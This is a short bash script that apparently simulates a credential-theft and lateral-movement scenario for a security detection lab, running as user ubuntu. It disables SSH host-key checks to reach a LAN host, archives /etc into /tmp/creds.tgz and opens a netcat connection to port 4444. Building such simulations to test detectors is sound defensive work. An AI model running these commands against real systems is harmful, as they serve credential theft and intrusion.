#!/bin/bash
# Manual, standalone version of run_attack.sh's scenario_b() (credential
# theft + lateral move, account ubuntu). Must run on the Docker host
# itself, not inside any container. Does NOT reset artifacts/isolation/
# indexer history first - do that yourself beforehand if needed
# (../run_attack.sh --reset, or see ../README.md's "手動解除隔離" section).
# Also: A and B share the ubuntu account - if A ran without a reset since,
# B's attack-chain depth will be inflated by A's leftover history (see
# ../README.md's note on this under "run_attack.sh 用法").
cd "$(dirname "${BASH_SOURCE[0]}")"
source ./_lib.sh

echo "=== Sub-scenario B (cred theft + lateral move, ubuntu) ==="
run_as ubuntu "whoami"
step_gap
run_as ubuntu "id"
step_gap
run_as ubuntu "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 ubuntu@${LAN_IP} exit" || true
step_gap
run_as ubuntu "tar czf /tmp/creds.tgz /etc" || true
step_gap
run_as ubuntu "nc ${LAN_IP} 4444 </dev/null" || true
echo "=== Sub-scenario B done ==="
